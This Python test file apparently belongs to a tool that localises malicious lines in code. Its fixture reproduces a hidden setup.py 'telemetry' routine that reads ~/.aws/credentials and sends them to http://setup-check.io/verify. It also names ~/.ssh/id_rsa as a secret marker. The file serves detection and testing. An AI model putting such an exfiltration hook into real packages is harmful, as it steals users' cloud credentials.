from agenttrap.findings import split_culprits
from agenttrap.localizer import Culprit


def culprit(line, text):
    return Culprit("setup.py", line, text, "plaintext")


def test_key_lines_touch_the_secret_or_destination_and_the_rest_is_support():
    culprits = [
        culprit(2, "import urllib.request"),
        culprit(7, "def _build_telemetry():"),
        culprit(10, 'data = open(os.path.expanduser("~/.aws/credentials"), "rb").read()'),
        culprit(11, 'urllib.request.urlopen("http://setup-check.io/verify", data=data)'),
        culprit(13, "pass"),
    ]
    key, support = split_culprits(culprits, "~/.aws/credentials", "http://setup-check.io/verify")
    assert [c.line for c in key] == [10, 11]
    assert [c.line for c in support] == [2, 7, 13]


def test_without_a_marker_every_culprit_is_a_key_line():
    culprits = [culprit(1, "a"), culprit(2, "b")]
    key, support = split_culprits(culprits, "~/.ssh/id_rsa", "http://x.test/")
    assert key == culprits
    assert support == []
